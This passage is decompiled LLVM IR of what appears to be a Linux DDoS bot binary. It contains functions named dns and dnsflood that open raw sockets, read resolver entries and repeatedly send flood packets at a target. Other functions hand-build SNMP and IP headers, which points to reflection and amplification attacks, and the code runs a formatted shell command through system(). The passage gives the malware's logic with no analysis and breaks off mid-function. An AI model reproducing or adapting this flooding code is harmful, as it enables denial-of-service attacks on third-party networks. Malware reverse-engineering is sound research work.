  store i32 0, i32* %v1_8049e18, align 4
  %v0_8049e1e = load i32, i32* %eax.global-to-local, align 4
  %v1_8049e1e = add i32 %v0_8049e1e, 4
  %v2_8049e1e = inttoptr i32 %v1_8049e1e to i32*
  store i32 0, i32* %v2_8049e1e, align 4
  %v0_8049e25 = load i32, i32* %eax.global-to-local, align 4
  %v1_8049e25 = add i32 %v0_8049e25, 8
  %v2_8049e25 = inttoptr i32 %v1_8049e25 to i32*
  store i32 0, i32* %v2_8049e25, align 4
  %v0_8049e2c = load i32, i32* %eax.global-to-local, align 4
  %v1_8049e2c = add i32 %v0_8049e2c, 12
  %v2_8049e2c = inttoptr i32 %v1_8049e2c to i32*
  store i32 0, i32* %v2_8049e2c, align 4
  %v0_8049e33 = load i32, i32* @global_var_807e520.80, align 32
  store i32 %v0_8049e33, i32* @ebx, align 4
  store i32 %v2_8049d5f, i32* %eax.global-to-local, align 4
  %v1_8049e40 = call i32 @inet_addr(i32 %v2_8049d5f)
  store i32 %v1_8049e40, i32* %eax.global-to-local, align 4
  %v1_8049e48 = load i32, i32* @ebx, align 4
  %v2_8049e48 = add i32 %v1_8049e48, 4
  %v3_8049e48 = inttoptr i32 %v2_8049e48 to i32*
  store i32 %v1_8049e40, i32* %v3_8049e48, align 4
  %v0_8049e4b = load i32, i32* @global_var_807e520.80, align 32
  %v1_8049e56 = call i32 @htons(i32 53)
  %v2_8049e56 = trunc i32 %v1_8049e56 to i16
  %v4_8049e5e = add i32 %v0_8049e4b, 2
  %v5_8049e5e = inttoptr i32 %v4_8049e5e to i16*
  store i16 %v2_8049e56, i16* %v5_8049e5e, align 2
  %v0_8049e62 = load i32, i32* @global_var_807e520.80, align 32
  %v1_8049e67 = add i32 %v0_8049e62, 16
  store i32 %v1_8049e67, i32* %edx.global-to-local, align 4
  store i32 %v2_8049d93, i32* @eax, align 4
  %v2_8049e75 = inttoptr i32 %v1_8049e67 to i8*
  %v3_8049e75 = call i32 @strcpy(i8* %v2_8049e75, i32 %v2_8049d93)
  %v0_8049e7d = load i32, i32* @global_var_807e520.80, align 32
  %v2_8049e86 = add i32 %v0_8049e7d, 528
  %v3_8049e86 = inttoptr i32 %v2_8049e86 to i32*
  store i32 %arg2, i32* %v3_8049e86, align 4
  %v0_8049e8c = load i32, i32* @global_var_807e520.80, align 32
  %v2_8049e97 = add i32 %v0_8049e8c, 532
  %v3_8049e97 = inttoptr i32 %v2_8049e97 to i32*
  store i32 %v0_8049e8c, i32* %v3_8049e97, align 4
  %v0_8049e9d = load i32, i32* @global_var_807e520.80, align 32
  store i32 %v0_8049e9d, i32* @edx, align 4
  store i32 %v0_8049e9d, i32* %eax.global-to-local, align 4
  %v2_8049ea8 = add i32 %v0_8049e9d, 536
  %v3_8049ea8 = inttoptr i32 %v2_8049ea8 to i32*
  store i32 %v0_8049e9d, i32* %v3_8049ea8, align 4
  br label %dec_label_pc_8049f66

dec_label_pc_8049eb3:                             ; preds = %dec_label_pc_8049df1
  store i32 %v1_8049ebb, i32* @edx, align 4
  store i32 540, i32* %eax.global-to-local, align 4
  %v3_8049ed7 = inttoptr i32 %v1_8049ebb to i8*
  %v4_8049ed7 = call i32 @__GI_memset(i8* %v3_8049ed7, i32 0, i32 540)
  store i32 %v2_8049d5f, i32* %eax.global-to-local, align 4
  %v1_8049ee6 = call i32 @inet_addr(i32 %v2_8049d5f)
  store i32 %v1_8049ee6, i32* %edx.global-to-local, align 4
  store i32 %v1_8049ebb, i32* %eax.global-to-local, align 4
  %v2_8049ef3 = add i32 %v1_8049ebb, 4
  %v3_8049ef3 = inttoptr i32 %v2_8049ef3 to i32*
  store i32 %v1_8049ee6, i32* %v3_8049ef3, align 4
  %v1_8049efb = call i32 @htons(i32 53)
  %v2_8049efb = trunc i32 %v1_8049efb to i16
  %v3_8049f08 = add i32 %v1_8049ebb, 2
  %v4_8049f08 = inttoptr i32 %v3_8049f08 to i16*
  store i16 %v2_8049efb, i16* %v4_8049f08, align 2
  %v1_8049f0f = add i32 %v1_8049ebb, 16
  store i32 %v1_8049f0f, i32* %edx.global-to-local, align 4
  store i32 %v2_8049d93, i32* @eax, align 4
  %v2_8049f1d = inttoptr i32 %v1_8049f0f to i8*
  %v3_8049f1d = call i32 @strcpy(i8* %v2_8049f1d, i32 %v2_8049d93)
  %v0_8049f25 = load i32, i32* @global_var_807e520.80, align 32
  %v2_8049f2e = add i32 %v1_8049ebb, 536
  %v3_8049f2e = inttoptr i32 %v2_8049f2e to i32*
  store i32 %v0_8049f25, i32* %v3_8049f2e, align 4
  %v0_8049f34 = load i32, i32* @global_var_807e520.80, align 32
  store i32 %v0_8049f34, i32* %edx.global-to-local, align 4
  %v2_8049f3d = add i32 %v0_8049f34, 528
  %v3_8049f3d = inttoptr i32 %v2_8049f3d to i32*
  store i32 %arg2, i32* %v3_8049f3d, align 4
  %v0_8049f43 = load i32, i32* @global_var_807e520.80, align 32
  store i32 %v0_8049f43, i32* %eax.global-to-local, align 4
  %v1_8049f48 = add i32 %v0_8049f43, 532
  %v2_8049f48 = inttoptr i32 %v1_8049f48 to i32*
  %v3_8049f48 = load i32, i32* %v2_8049f48, align 4
  %v2_8049f51 = add i32 %v1_8049ebb, 532
  %v3_8049f51 = inttoptr i32 %v2_8049f51 to i32*
  store i32 %v3_8049f48, i32* %v3_8049f51, align 4
  %v0_8049f57 = load i32, i32* @global_var_807e520.80, align 32
  store i32 %v0_8049f57, i32* @edx, align 4
  store i32 %v1_8049ebb, i32* %eax.global-to-local, align 4
  %v2_8049f60 = add i32 %v0_8049f57, 532
  %v3_8049f60 = inttoptr i32 %v2_8049f60 to i32*
  store i32 %v1_8049ebb, i32* %v3_8049f60, align 4
  br label %dec_label_pc_8049f66

dec_label_pc_8049f66:                             ; preds = %dec_label_pc_8049dfe, %dec_label_pc_8049eb3
  %v2_8049f69 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8049f69, i32* @ebx, align 4
  store i32 %v0_8049cb6, i32* @edi, align 4
  %v0_8049f6c = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_8049f6c

; uselistorder directives
  uselistorder i32 %v1_8049ee6, { 1, 0 }
  uselistorder i32 %v0_8049e9d, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8049e8c, { 1, 0 }
  uselistorder i32 %v1_8049ebb, { 2, 1, 3, 4, 5, 6, 8, 7, 0, 12, 11, 10, 9, 13 }
  uselistorder i32 %v1_8049de8, { 1, 0 }
  uselistorder i32 %storemerge, { 2, 0, 1 }
  uselistorder i32 %stack_var_-20.1, { 5, 4, 0, 3, 2, 1 }
  uselistorder i8* %v1_8049d36, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v6_8049d33, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32 %v2_8049d5f, { 1, 0, 3, 2 }
  uselistorder i32 %v2_8049d93, { 1, 0, 3, 2 }
  uselistorder i32 %v4_8049dcb, { 1, 0, 2 }
  uselistorder i32 %v3_8049cbe, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-56, { 0, 2, 1 }
  uselistorder i32* %stack_var_-568, { 0, 2, 1 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 6, 7, 4, 5, 8, 9 }
  uselistorder i32* %eax.global-to-local, { 6, 0, 1, 2, 3, 4, 7, 8, 9, 10, 11, 12, 13, 5, 14, 27, 28, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 29, 30, 31, 32 }
  uselistorder i32 511, { 0, 2, 1, 3 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8049f66, { 1, 0 }
  uselistorder label %dec_label_pc_8049dc8, { 1, 0 }
  uselistorder label %dec_label_pc_8049dc5, { 3, 0, 1, 2 }
}

define i32 @dns(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-1367 = alloca i32, align 4
  %stack_var_-1111 = alloca i32, align 4
  %stack_var_-1080 = alloca i32, align 4
  %stack_var_-1404 = alloca i32, align 4
  %v15_8049f73 = ptrtoint i32* %stack_var_-1404 to i32
  store i32 %v15_8049f73, i32* @eax, align 4
  %v2_8049f87 = call i32 @mfork(i32 %arg1)
  store i32 %v2_8049f87, i32* %eax.global-to-local, align 4
  %v1_8049f8f = icmp eq i32 %v2_8049f87, 0
  %v1_8049f91 = icmp eq i1 %v1_8049f8f, false
  br i1 %v1_8049f91, label %dec_label_pc_804a338, label %dec_label_pc_8049f97

dec_label_pc_8049f97:                             ; preds = %entry
  %v4_8049fa3 = call i32 @socket(i32 2, i32 3, i32 255)
  store i32 %v4_8049fa3, i32* %eax.global-to-local, align 4
  %v5_8049fae = icmp slt i32 %v4_8049fa3, 0
  %v1_8049fb2 = icmp eq i1 %v5_8049fae, false
  br i1 %v1_8049fb2, label %dec_label_pc_8049fbe, label %dec_label_pc_8049fb4

dec_label_pc_8049fb4:                             ; preds = %dec_label_pc_8049f97
  %v2_8049fb9 = call i32 @__GI_exit(i32 1)
  store i32 %v2_8049fb9, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8049fbe

dec_label_pc_8049fbe:                             ; preds = %dec_label_pc_8049f97, %dec_label_pc_8049fb4
  %v4_8049fbe = add i32 %arg2, -4
  %v9_8049fbe = sub i32 3, %arg2
  %v10_8049fbe = and i32 %v9_8049fbe, %arg2
  %v11_8049fbe = icmp slt i32 %v10_8049fbe, 0
  %v12_8049fbe = icmp eq i32 %v4_8049fbe, 0
  %v13_8049fbe = icmp slt i32 %v4_8049fbe, 0
  %v3_8049fc2 = icmp eq i1 %v13_8049fbe, %v11_8049fbe
  %v4_8049fc2 = icmp eq i1 %v12_8049fbe, false
  %v5_8049fc2 = and i1 %v4_8049fc2, %v3_8049fc2
  br i1 %v5_8049fc2, label %dec_label_pc_8049fe7, label %dec_label_pc_8049fc4

dec_label_pc_8049fc4:                             ; preds = %dec_label_pc_8049fbe
  %v0_8049fc4 = load i32, i32* @global_var_807d3d0.29, align 16
  store i32 %v0_8049fc4, i32* %eax.global-to-local, align 4
  %v3_8049fd5 = call i32 @Send(i32 %v0_8049fc4, i32 ptrtoint ([67 x i8]* @global_var_8068db4.81 to i32))
  store i32 %v3_8049fd5, i32* %eax.global-to-local, align 4
  %v1_8049fe2 = call i32 @__GI_exit(i32 -1)
  store i32 %v1_8049fe2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8049fe7

dec_label_pc_8049fe7:                             ; preds = %dec_label_pc_8049fbe, %dec_label_pc_8049fc4
  %v1_8049fea = add i32 %arg3, 12
  store i32 %v1_8049fea, i32* %eax.global-to-local, align 4
  %v1_8049fed = inttoptr i32 %v1_8049fea to i32*
  %v2_8049fed = load i32, i32* %v1_8049fed, align 4
  store i32 -1, i32* %ecx.global-to-local, align 4
  store i32 %v2_8049fed, i32* %stack_var_-1404, align 4
  %v1_8049ffa = and i32 %v2_8049fed, -256
  store i32 %v1_8049ffa, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  %v4_8049ffd = inttoptr i32 %v2_8049fed to i8*
  %v3_804a003 = call i32 @_strlen(i8* %v4_8049ffd)
  %v4_804a003 = mul i32 %v3_804a003, -1
  %v5_804a003 = add i32 %v4_804a003, -2
  store i32 %v5_804a003, i32* %ecx.global-to-local, align 4
  %v1_804a009 = sub i32 0, %v4_804a003
  store i32 %v1_804a009, i32* %edx.global-to-local, align 4
  %v2_804a011 = mul i32 %v3_804a003, 5
  %v1_804a013 = add i32 %v2_804a011, 160
  store i32 %v1_804a013, i32* %eax.global-to-local, align 4
  %v4_804a01b = add i32 %v2_804a011, -863
  %v9_804a01b = sub i32 862, %v2_804a011
  %v10_804a01b = and i32 %v9_804a01b, %v1_804a013
  %v11_804a01b = icmp slt i32 %v10_804a01b, 0
  %v12_804a01b = icmp eq i32 %v4_804a01b, 0
  %v13_804a01b = icmp slt i32 %v4_804a01b, 0
  %v3_804a022 = icmp eq i1 %v13_804a01b, %v11_804a01b
  %v4_804a022 = icmp eq i1 %v12_804a01b, false
  %v5_804a022 = and i1 %v4_804a022, %v3_804a022
  br i1 %v5_804a022, label %dec_label_pc_804a338, label %dec_label_pc_804a028

dec_label_pc_804a028:                             ; preds = %dec_label_pc_8049fe7
  store i32 %v1_8049fea, i32* %eax.global-to-local, align 4
  %v2_804a02e = load i32, i32* %v1_8049fed, align 4
  store i32 %v2_804a02e, i32* %edx.global-to-local, align 4
  store i32 %v1_8049fea, i32* %eax.global-to-local, align 4
  %v2_804a036 = load i32, i32* %v1_8049fed, align 4
  store i32 %v2_804a036, i32* %ecx.global-to-local, align 4
  store i32 %v1_8049fea, i32* %eax.global-to-local, align 4
  %v2_804a03e = load i32, i32* %v1_8049fed, align 4
  store i32 %v2_804a03e, i32* @ebx, align 4
  store i32 %v1_8049fea, i32* %eax.global-to-local, align 4
  %v2_804a046 = load i32, i32* %v1_8049fed, align 4
  store i32 %v2_804a046, i32* @esi, align 4
  store i32 %v1_8049fea, i32* %eax.global-to-local, align 4
  %v2_804a04e = load i32, i32* %v1_8049fed, align 4
  store i32 %v1_804a013, i32* @edi, align 4
  %v2_804a05e = ptrtoint i32* %stack_var_-1080 to i32
  store i32 %v2_804a05e, i32* %eax.global-to-local, align 4
  %v10_804a065 = call i32 @__GI_snprintf(i32 %v2_804a05e, i32 %v1_804a013, i32 ptrtoint ([171 x i8]* @global_var_8068df8.82 to i32), i32 %v2_804a04e, i32 %v2_804a046, i32 %v2_804a03e, i32 %v2_804a036)
  store i32 %v2_804a05e, i32* %eax.global-to-local, align 4
  %v2_804a077 = call i32 @system(i32 %v2_804a05e)
  store i32 %v2_804a077, i32* %eax.global-to-local, align 4
  store i32 0, i32* @global_var_807e520.80, align 32
  %v2_804a091 = call i32 @malloc(i32 256)
  store i32 %v2_804a091, i32* %edx.global-to-local, align 4
  store i32 256, i32* %eax.global-to-local, align 4
  %v5_804a0ac = inttoptr i32 %v2_804a091 to i8*
  %v5_804a0ad = call i32 @__GI_memset(i8* %v5_804a0ac, i32 0, i32 256)
  %v3_804a0b8 = and i32 %v5_804a0ad, -256
  %v2_804a0c3 = ptrtoint i32* %stack_var_-1111 to i32
  %tmp47 = bitcast i32* %stack_var_-1111 to i8*
  store i32 %v2_804a0c3, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  store i32 31, i32* %ecx.global-to-local, align 4
  store i32 %v3_804a0b8, i32* %eax.global-to-local, align 4
  %v5_804a0d1 = call i8* @_memset(i8* %tmp47, i32 %v3_804a0b8, i32 31)
  %v6_804a0d1 = ptrtoint i8* %v5_804a0d1 to i32
  store i32 %v6_804a0d1, i32* %ecx.global-to-local, align 4
  %v2_804a0de = ptrtoint i32* %stack_var_-1367 to i32
  store i32 %v2_804a0de, i32* %edx.global-to-local, align 4
  store i32 255, i32* %eax.global-to-local, align 4
  %tmp48 = bitcast i32* %stack_var_-1367 to i8*
  %v5_804a0f0 = call i32 @__GI_memset(i8* %tmp48, i32 0, i32 255)
  store i32 %v5_804a0f0, i32* @eax, align 4
  %v3_804a10c = call i32 @__GI_fopen(i32 ptrtoint ([8 x i8]* @global_var_8068ea5.84 to i32), i32 ptrtoint ([2 x i8]* @global_var_8068ea3.83 to i32))
  store i32 %v3_804a10c, i32* %eax.global-to-local, align 4
  %v8_804a138 = inttoptr i32 %v5_804a0ad to i8*
  br label %dec_label_pc_804a12d

dec_label_pc_804a119:                             ; preds = %dec_label_pc_804a12d
  %v4_804a122 = call i32 @ParseResolverLine(i8* %v8_804a138, i32 %stack_var_-40.0)
  store i32 %v4_804a122, i32* %eax.global-to-local, align 4
  %v4_804a12a = add i32 %stack_var_-40.0, 1
  br label %dec_label_pc_804a12d

dec_label_pc_804a12d:                             ; preds = %dec_label_pc_804a028, %dec_label_pc_804a119
  %stack_var_-40.0 = phi i32 [ 0, %dec_label_pc_804a028 ], [ %v4_804a12a, %dec_label_pc_804a119 ]
  %v4_804a13b = call i32 @fgets(i32 %v5_804a0ad, i32 256, i32 %v3_804a10c)
  store i32 %v4_804a13b, i32* @eax, align 4
  %v1_804a143 = icmp eq i32 %v4_804a13b, 0
  %v1_804a145 = icmp eq i1 %v1_804a143, false
  br i1 %v1_804a145, label %dec_label_pc_804a119, label %dec_label_pc_804a147

dec_label_pc_804a147:                             ; preds = %dec_label_pc_804a12d
  %v1_804a151 = add i32 %arg3, 16
  store i32 %v1_804a151, i32* %eax.global-to-local, align 4
  %v1_804a154 = inttoptr i32 %v1_804a151 to i32*
  %v2_804a154 = load i32, i32* %v1_804a154, align 4
  store i32 %v2_804a154, i32* %eax.global-to-local, align 4
  %v2_804a15a = call i32 @atol(i32 %v2_804a154)
  %v0_804a165 = load i32, i32* @global_var_807e520.80, align 32
  store i32 %v0_804a165, i32* %eax.global-to-local, align 4
  %v1_804a16a = add i32 %v0_804a165, 532
  %v2_804a16a = inttoptr i32 %v1_804a16a to i32*
  %v3_804a16a = load i32, i32* %v2_804a16a, align 4
  store i32 %v3_804a16a, i32* %eax.global-to-local, align 4
  %v2_804a181 = call i32 @htons(i32 0)
  %v1_804a193 = add i32 %arg3, 4
  store i32 %v1_804a193, i32* %eax.global-to-local, align 4
  %v1_804a196 = inttoptr i32 %v1_804a193 to i32*
  %v2_804a196 = load i32, i32* %v1_804a196, align 4
  store i32 %v2_804a196, i32* %eax.global-to-local, align 4
  %v2_804a19c = call i32 @inet_addr(i32 %v2_804a196)
  %v1_804a1ad = mul i32 %v2_804a15a, 4
  store i32 %v1_804a1ad, i32* %edx.global-to-local, align 4
  %v2_804a1bb = mul i32 %v2_804a15a, 28
  %v1_804a1c0 = add i32 %v2_804a1bb, 30
  %v2_804a1c3 = and i32 %v1_804a1c0, -16
  %v2_804a1c9 = sub i32 %v15_8049f73, %v2_804a1c3
  %v1_804a1d7 = add i32 %v2_804a1c9, 15
  %v2_804a1da = and i32 %v1_804a1d7, -16
  %v1_804a1f2 = add i32 %arg3, 8
  store i32 %v1_804a1f2, i32* %eax.global-to-local, align 4
  %v1_804a1f5 = inttoptr i32 %v1_804a1f2 to i32*
  %v2_804a1f5 = load i32, i32* %v1_804a1f5, align 4
  store i32 %v2_804a1f5, i32* %eax.global-to-local, align 4
  %v2_804a1fa = add i32 %v2_804a1c9, -16
  %v3_804a1fa = inttoptr i32 %v2_804a1fa to i32*
  store i32 %v2_804a1f5, i32* %v3_804a1fa, align 4
  %v1_804a1fb = call i32 @atol(i32 %v2_804a1da)
  %v0_804a200 = load i32, i32* @esp, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v5_804a2d654 = icmp sgt i32 %v2_804a15a, 0
  br i1 %v5_804a2d654, label %dec_label_pc_804a212.lr.ph, label %dec_label_pc_804a2dc

dec_label_pc_804a212.lr.ph:                       ; preds = %dec_label_pc_804a147
  %v3_804a246 = or i32 %v2_804a1da, 8
  br label %dec_label_pc_804a212

dec_label_pc_804a212:                             ; preds = %dec_label_pc_804a212, %dec_label_pc_804a212.lr.ph
  %storemerge55 = phi i32 [ 0, %dec_label_pc_804a212.lr.ph ], [ %v4_804a2cd, %dec_label_pc_804a212 ]
  %v1_804a218 = mul i32 %storemerge55, 4
  %v2_804a226 = mul i32 %storemerge55, 28
  %v3_804a22b = add i32 %v2_804a226, %v2_804a1da
  %v4_804a22b = inttoptr i32 %v3_804a22b to i32*
  store i32 %storemerge55, i32* %v4_804a22b, align 4
  store i32 %v2_804a1da, i32* %ecx.global-to-local, align 4
  store i32 %v2_804a226, i32* %edx.global-to-local, align 4
  %v4_804a246 = add i32 %v3_804a246, %v2_804a226
  %v5_804a246 = inttoptr i32 %v4_804a246 to i32*
  store i32 2, i32* %v5_804a246, align 4
  %v1_804a250 = load i32, i32* %edx.global-to-local, align 4
  %v2_804a250 = load i32, i32* %ecx.global-to-local, align 4
  %v3_804a250 = add i32 %v1_804a250, 12
  %v4_804a250 = add i32 %v3_804a250, %v2_804a250
  %v5_804a250 = inttoptr i32 %v4_804a250 to i32*
  store i32 %v2_804a19c, i32* %v5_804a250, align 4
  %v1_804a25a = load i32, i32* %edx.global-to-local, align 4
  %v2_804a25a = load i32, i32* %ecx.global-to-local, align 4
  %v3_804a25a = add i32 %v1_804a25a, 16
  %v4_804a25a = add i32 %v3_804a25a, %v2_804a25a
  %v5_804a25a = inttoptr i32 %v4_804a25a to i32*
  %v1_804a264 = load i32, i32* %edx.global-to-local, align 4
  %v2_804a264 = load i32, i32* %ecx.global-to-local, align 4
  %v3_804a264 = add i32 %v1_804a264, 20
  %v4_804a264 = add i32 %v3_804a264, %v2_804a264
  %v5_804a264 = inttoptr i32 %v4_804a264 to i32*
  %v1_804a280 = add i32 %v3_804a22b, 4
  %v2_804a286 = inttoptr i32 %v1_804a280 to i32*
  store i32 %v3_804a16a, i32* %v2_804a286, align 4
  %v1_804a2a0 = add i32 %v3_804a22b, 24
  %v2_804a2a6 = inttoptr i32 %v1_804a2a0 to i32*
  store i32 %v1_804a1fb, i32* %v2_804a2a6, align 4
  store i32 %v2_804a1da, i32* @ecx, align 4
  store i32 %v1_804a218, i32* %edx.global-to-local, align 4
  store i32 %v3_804a22b, i32* %eax.global-to-local, align 4
  %v0_804a2c1 = load i32, i32* @esp, align 4
  %v2_804a2c4 = add i32 %v0_804a2c1, -16
  %v3_804a2c4 = inttoptr i32 %v2_804a2c4 to i32*
  store i32 %v3_804a22b, i32* %v3_804a2c4, align 4
  %v0_804a2c5 = call i32 @dnsflood()
  %v0_804a2ca = load i32, i32* @esp, align 4
  %v4_804a2cd = add nuw nsw i32 %storemerge55, 1
  store i32 %v4_804a2cd, i32* %eax.global-to-local, align 4
  %exitcond = icmp eq i32 %v4_804a2cd, %v2_804a15a
  br i1 %exitcond, label %dec_label_pc_804a2dc, label %dec_label_pc_804a212

dec_label_pc_804a2dc:                             ; preds = %dec_label_pc_804a212, %dec_label_pc_804a147
  %v0_804a2f2.lcssa.in = phi i32 [ %v0_804a200, %dec_label_pc_804a147 ], [ %v0_804a2ca, %dec_label_pc_804a212 ]
  %storemerge.lcssa = phi i32 [ 0, %dec_label_pc_804a147 ], [ %v2_804a15a, %dec_label_pc_804a212 ]
  store i32 %v1_804a1f2, i32* %eax.global-to-local, align 4
  %v2_804a2e2 = load i32, i32* %v1_804a1f5, align 4
  store i32 %v2_804a2e2, i32* %edx.global-to-local, align 4
  store i32 %v1_804a193, i32* %eax.global-to-local, align 4
  %v2_804a2ea = load i32, i32* %v1_804a196, align 4
  store i32 %v2_804a2ea, i32* %eax.global-to-local, align 4
  %v0_804a2ec = load i32, i32* @global_var_807d3d0.29, align 16
  store i32 %v0_804a2ec, i32* %ecx.global-to-local, align 4
  %v3_804a2f5 = inttoptr i32 %v0_804a2f2.lcssa.in to i32*
  store i32 %v2_804a2e2, i32* %v3_804a2f5, align 4
  %v0_804a2f6 = load i32, i32* %eax.global-to-local, align 4
  %v2_804a2f6 = add i32 %v0_804a2f2.lcssa.in, -4
  %v3_804a2f6 = inttoptr i32 %v2_804a2f6 to i32*
  store i32 %v0_804a2f6, i32* %v3_804a2f6, align 4
  %v5_804a2f7 = add i32 %v0_804a2f2.lcssa.in, -8
  %v6_804a2f7 = inttoptr i32 %v5_804a2f7 to i32*
  store i32 %arg1, i32* %v6_804a2f7, align 4
  %v1_804a2fa = add i32 %v0_804a2f2.lcssa.in, -12
  %v2_804a2fa = inttoptr i32 %v1_804a2fa to i32*
  store i32 ptrtoint ([36 x i8]* @global_var_8068eb0.85 to i32), i32* %v2_804a2fa, align 4
  %v0_804a2ff = load i32, i32* %ecx.global-to-local, align 4
  %v2_804a2ff = add i32 %v0_804a2f2.lcssa.in, -16
  %v3_804a2ff = inttoptr i32 %v2_804a2ff to i32*
  store i32 %v0_804a2ff, i32* %v3_804a2ff, align 4
  %v2_804a300 = call i32 @Send(i32 %storemerge.lcssa, i32 %v2_804a15a)
  store i32 %v2_804a300, i32* %eax.global-to-local, align 4
  %v0_804a305 = load i32, i32* @esp, align 4
  %v1_804a305 = add i32 %v0_804a305, 32
  %v7_804a30c = icmp sgt i32 %arg2, 4
  br i1 %v7_804a30c, label %dec_label_pc_804a30e, label %dec_label_pc_804a32e

dec_label_pc_804a30e:                             ; preds = %dec_label_pc_804a2dc
  %v1_804a311 = add i32 %arg3, 20
  store i32 %v1_804a311, i32* %eax.global-to-local, align 4
  %v1_804a314 = inttoptr i32 %v1_804a311 to i32*
  %v2_804a314 = load i32, i32* %v1_804a314, align 4
  store i32 %v2_804a314, i32* %eax.global-to-local, align 4
  %v2_804a319 = add i32 %v0_804a305, 16
  %v3_804a319 = inttoptr i32 %v2_804a319 to i32*
  store i32 %v2_804a314, i32* %v3_804a319, align 4
  %v1_804a31a = call i32 @atol(i32 %storemerge.lcssa)
  store i32 %v1_804a31a, i32* %eax.global-to-local, align 4
  %v0_804a31f = load i32, i32* @esp, align 4
  %v3_804a325 = inttoptr i32 %v0_804a31f to i32*
  store i32 %v1_804a31a, i32* %v3_804a325, align 4
  %v1_804a326 = call i32 @sleep(i32 %storemerge.lcssa)
  store i32 %v1_804a326, i32* %eax.global-to-local, align 4
  %v0_804a32b = load i32, i32* @esp, align 4
  %v1_804a32b = add i32 %v0_804a32b, 16
  br label %dec_label_pc_804a32e

dec_label_pc_804a32e:                             ; preds = %dec_label_pc_804a2dc, %dec_label_pc_804a30e
  %v0_804a32e = phi i32 [ %v1_804a305, %dec_label_pc_804a2dc ], [ %v1_804a32b, %dec_label_pc_804a30e ]
  %v1_804a331 = add i32 %v0_804a32e, -16
  %v2_804a331 = inttoptr i32 %v1_804a331 to i32*
  store i32 1, i32* %v2_804a331, align 4
  %v1_804a333 = call i32 @__GI_exit(i32 %storemerge.lcssa)
  store i32 %v1_804a333, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804a338

dec_label_pc_804a338:                             ; preds = %dec_label_pc_8049fe7, %entry, %dec_label_pc_804a32e
  %v0_804a345 = phi i32 [ %v1_804a013, %dec_label_pc_8049fe7 ], [ %v2_8049f87, %entry ], [ %v1_804a333, %dec_label_pc_804a32e ]
  ret i32 %v0_804a345

; uselistorder directives
  uselistorder i32 %storemerge.lcssa, { 3, 2, 1, 0 }
  uselistorder i32 %v2_804a226, { 0, 2, 1 }
  uselistorder i32 %storemerge55, { 3, 2, 0, 1 }
  uselistorder i32 %v2_804a1da, { 4, 3, 1, 0, 2 }
  uselistorder i32 %v2_804a15a, { 3, 0, 1, 2, 5, 4 }
  uselistorder i32 %v3_804a0b8, { 1, 0 }
  uselistorder i32 %v5_804a0ad, { 1, 0, 2 }
  uselistorder i32 %v4_804a01b, { 1, 0 }
  uselistorder i32 %v1_804a013, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v4_8049fbe, { 1, 0 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10, 42, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41 }
  uselistorder i32 %arg3, { 4, 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804a338, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804a32e, { 1, 0 }
  uselistorder label %dec_label_pc_804a12d, { 1, 0 }
  uselistorder label %dec_label_pc_8049fe7, { 1, 0 }
  uselistorder label %dec_label_pc_8049fbe, { 1, 0 }
}

define i32 @setup_snmp_header(i16* %arg1) local_unnamed_addr {
entry:
  %v1_804a354 = call i32 @htons(i32 4500)
  %v2_804a354 = trunc i32 %v1_804a354 to i16
  %v4_804a35e = ptrtoint i16* %arg1 to i32
  store i16 %v2_804a354, i16* %arg1, align 2
  %v1_804a36c = call i32 @htons(i32 161)
  %v2_804a36c = trunc i32 %v1_804a36c to i16
  %v3_804a379 = add i32 %v4_804a35e, 2
  %v4_804a379 = inttoptr i32 %v3_804a379 to i16*
  store i16 %v2_804a36c, i16* %v4_804a379, align 2
  %v1_804a380 = add i32 %v4_804a35e, 6
  %v2_804a380 = inttoptr i32 %v1_804a380 to i16*
  store i16 0, i16* %v2_804a380, align 2
  %v1_804a389 = add i32 %v4_804a35e, 8
  %v3_804a39e = inttoptr i32 %v1_804a389 to i16*
  %v4_804a39e = call i32 @memcpy(i16* %v3_804a39e, i32 ptrtoint (i32* @global_var_8068ed4.86 to i32), i32 67)
  %v1_804a3ab = call i32 @htons(i32 75)
  %v2_804a3ab = trunc i32 %v1_804a3ab to i16
  %v4_804a3b8 = add i32 %v4_804a35e, 4
  %v5_804a3b8 = inttoptr i32 %v4_804a3b8 to i16*
  store i16 %v2_804a3ab, i16* %v5_804a3b8, align 2
  ret i32 %v4_804a35e

; uselistorder directives
  uselistorder i16* %arg1, { 1, 0 }
}

define i32 @setup_ip_header(i8* %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_804a3be = load i32, i32* @ebp, align 4
  store i32 %v0_804a3be, i32* %stack_var_-4, align 4
  %v4_804a3c4 = ptrtoint i8* %arg1 to i32
  store i8 69, i8* %arg1, align 1
  %v1_804a3e1 = add i32 %v4_804a3c4, 1
  %v2_804a3e1 = inttoptr i32 %v1_804a3e1 to i8*
  store i8 0, i8* %v2_804a3e1, align 1
  %v1_804a3e8 = add i32 %v4_804a3c4, 2
  %v2_804a3e8 = inttoptr i32 %v1_804a3e8 to i16*
  store i16 42, i16* %v2_804a3e8, align 2
